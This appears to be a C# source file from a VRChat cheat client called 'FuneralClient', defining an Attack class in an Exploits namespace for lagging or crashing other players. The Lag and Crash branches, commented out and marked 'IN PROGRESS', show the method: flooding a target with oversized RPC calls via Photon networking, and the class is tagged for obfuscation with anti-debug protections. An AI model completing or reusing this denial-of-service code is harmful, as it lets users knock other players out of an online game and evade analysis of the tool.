using FuneralClient.Utils.API;
using FuneralClient.Utils.ConsoleUtil;
using FuneralClient.Utils.Other;
using Photon.Pun;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using VRC;
using VRC.Core;
using VRC.UI;
using VRCSDK2;

namespace FuneralClient.Utils.Exploits
{
    [System.Reflection.Obfuscation(Exclude = false, ApplyToMembers = true, Feature = "+ctrl flow;+rename;+constants;+anti debug;+anti ildasm;+ref proxy;+resources")]
    public class Attack
    {
        public int AttackID { get; set; }

        public CoffinUser Target { get; set; }

        public CoffinUser Attacker { get; set; }

        public AttackType attackType { get; set; }

        public bool Finished { get; set; }

        public Attack(CoffinUser Target, CoffinUser Attacker)
        {
            AttackID = new Random().Next(1, 999999);
            Finished = false;

            StartAttack(Target, attackType);
            ConsoleUtils.Success("Called in AttackID: " + AttackID);
        }

        public void StartAttack(CoffinUser target, AttackType attackType)
        {
            switch(attackType)
            {
                case AttackType.Lag:
                    /*
                    new Thread(() =>
                    {
                        for(int i = 0; i < new Random().Next(1, 50); i++)
                        {
                            Networking.RPC(target.Plr.MNDPCPILHDO, target.Plr.gameObject, "RefreshAvatarRPC", new object[new Random().Next(1, 9999)]);
                        }
                        ConsoleUtils.Success($"Successfully hit the target: {target.Username}.");
                        Finished = true;
                        StopAttack();
                    }).Start();
                    */
                    //IN PROGRESS ^^
                    break;

                case AttackType.Crash:
                    /*
                    object[] array = new object[30000];
                    PhotonView photonView = PhotonView.Find(1);
                    new Thread(() =>
                    {
                        for (int i = 0; i < 6; i++)
                        {
                            photonView.RpcSecure("ReceiveVoiceStatsSyncRPC", target.Plr.IDDIEOAANOD, true, array);
                        }
                    }).Start();
                    */
                    //IN PROGRESS ^^ 
                    break;
            }
        }

        public bool StopAttack()
        {
            ExploitAPI.CalledInAttacks.Remove(this);
            ConsoleUtils.Success("Stopped AttackID: " + AttackID);

            return true;
        }
    }
}
